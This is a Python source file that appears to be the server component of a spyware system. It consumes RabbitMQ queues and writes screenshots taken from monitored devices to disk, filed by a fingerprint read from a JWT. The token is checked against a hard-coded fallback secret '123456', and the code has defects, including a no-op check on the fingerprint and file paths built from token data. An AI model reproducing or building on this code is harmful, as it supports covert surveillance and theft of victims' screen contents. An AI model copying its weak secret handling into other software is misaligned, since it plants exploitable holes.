import json, os
import jwt
from spyware_server_common.utils import createFolderIfNotExists, generate_random
from spyware_server_common.config import get_config

def create_screenshot_loader (fp) :
    def screenshot_loader (ch, method, properties, body) :
        dirname = os.path.join(os.path.join('screenshots/', fp))
        filename = os.path.join(dirname, f'{generate_random(20)}.bmp')

        with open(filename, 'ab') as f :
            f.write(body)
        
        ch.basic_ack(delivery_tag=method.delivery_tag)

    return screenshot_loader

def create_screenshots_callback (rmqConnection) :
    def screenshots_callback (ch, method, properties, body) :
        data = None
        config = get_config()

        ch.basic_ack(delivery_tag=method.delivery_tag)

        try :
            data = json.loads(body)
        except :
            return

        if 'token' not in data or 'queue' not in data :
            return

        queue = data.get('queue')
        token = data.get('token')

        try :
            tokenData = jwt.decode(token.encode(), config.get('secrect', '123456'), algorithms=["HS256"])
        except Exception as ex:
            return

        if tokenData is None : return

        fp = tokenData.get('fp')

        if fp is None : True

        createFolderIfNotExists('screenshots')
        createFolderIfNotExists(os.path.join('screenshots/', fp))
        newChannel = rmqConnection.channel()

        try :
            newChannel.basic_consume(queue, create_screenshot_loader(fp))
            newChannel.start_consuming()
        except Exception as ex :
            print("[ERROR] " +  ex.__str__())   

    return screenshots_callback